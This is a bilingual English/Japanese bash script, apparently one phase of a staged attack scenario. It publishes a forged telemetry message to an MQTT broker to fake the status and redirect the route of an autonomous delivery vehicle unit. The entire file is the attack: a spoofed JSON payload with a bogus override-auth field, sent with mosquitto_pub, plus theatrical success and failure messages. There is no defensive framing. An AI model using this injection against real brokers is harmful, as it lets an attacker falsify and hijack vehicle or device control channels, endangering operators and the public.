#!/bin/bash

# Force UTF-8 encoding so Japanese characters display properly
# 日本語文字が正しく表示されるようにUTF-8エンコーディングを強制する
export LANG=C.UTF-8
export LC_ALL=C.UTF-8

# Target MQTT Broker & Payload Configuration / ターゲットMQTTブローカーおよびペイロード設定
BROKER="192.168.1.168"
PORT="31883"
TOPIC="woven/mobility/epalette/unit-07/route"
PAYLOAD='{"unit_id":"ePalette-07","status":"IN_TRANSIT","speed_kmh":32,"origin":"Higashi-Fuji-North","destination":"SECTOR-9-SHADOW-DOCK","override_auth":"SYNAPSE-GHOST","timestamp":"2026-11-11T10:30:00Z"}'

# Bilingual Status Output / バイリンガルステータス出力
echo "[*] [PHASE 3: KAGE-TELEMETRY] Preparing Surgical Telemetry Spoof..."
echo "[*] [フェーズ 3: 影テレメトリ] 精密テレメトリスプーフィングを準備中..."
sleep 1.5

echo ""
echo "[+] Injecting Phantom Telemetry Payload into topic: $TOPIC"
echo "[+] トピックにファントムテレメトリペイロードを注入中: $TOPIC"

# Publish payload and check exit status / ペイロードを送信し終了ステータスを確認する
if mosquitto_pub -h "$BROKER" -p "$PORT" -t "$TOPIC" -m "$PAYLOAD"; then
    echo ""
    echo "[+] Injection complete. Shadow route active."
    echo "[+] 注入完了。シャドウルートが有効化されました。"
    else
        echo ""
        echo "[-] BLOCKED BY FUJI-GRID-ZERO: Broker rejected unauthenticated payload."
        echo "[-] FUJI-GRID-ZERO によりブロック: ブローカーが未認証のペイロードを拒否しました。"
        fi
        
